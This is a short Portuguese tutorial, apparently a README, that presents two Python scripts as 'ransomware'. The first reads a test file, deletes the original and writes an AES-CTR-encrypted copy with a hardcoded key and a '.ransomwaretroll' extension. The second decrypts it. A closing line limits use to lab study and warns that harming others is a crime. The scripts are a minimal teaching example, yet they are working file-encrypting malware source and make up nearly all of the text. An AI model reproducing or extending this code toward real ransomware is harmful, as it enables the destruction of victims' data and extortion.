RANSOMWARE PARA CRIPTOGRAFIA E DESCRIPTOGRAFIA DE ARQUIVO

Iremos utilizar como base de teste um arquivo .TXT a ferramente utilizada será o Kali Linux

antes de começar verifique se a biblioteca PYAES está baixada, caso não esteja realize o download para o funcionamento do código.

PASSO A PASSO

1. CÓDIGO PARA CRIPTOGRAGAR

import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

2. CÓDIGO PARA DESCRIPTOGRAFAR

import os
import pyaes

## abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()

LEMBRE-SE DE UTILIZAR ESSE CÓDIGO PARA ESTUDOS EM AMBIENTE CONTROLADO ( LABORATÓRIO ). É CRIME UTILIZA-LO EM AMBIENTE ABERTO OU PARA DANOS A TERCEIROS.
